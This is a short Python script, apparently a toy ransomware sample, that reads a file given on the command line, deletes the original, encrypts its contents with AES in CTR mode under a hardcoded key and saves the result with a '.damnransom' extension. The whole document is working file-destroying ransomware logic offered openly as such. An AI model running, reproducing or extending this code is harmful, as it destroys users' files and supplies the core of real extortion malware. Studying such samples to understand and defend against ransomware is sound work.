import os
import sys
import pyaes

# reading file with dumb test and explanation
try:
    file_name = sys.argv[1]
    file = open(file_name, 'rb')
    file_data = file.read()
    file.close()
except:
    print('No file to read.')
    print('Try again.')
    sys.exit()

# delete real file
os.remove(file_name)

# cryptography key
key = b'thereistheransom'
aes = pyaes.AESModeOfOperationCTR(key)

# messing the file
crypto_data = aes.encrypt(file_data)

# save modified file
new_file = file_name + '.damnransom'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
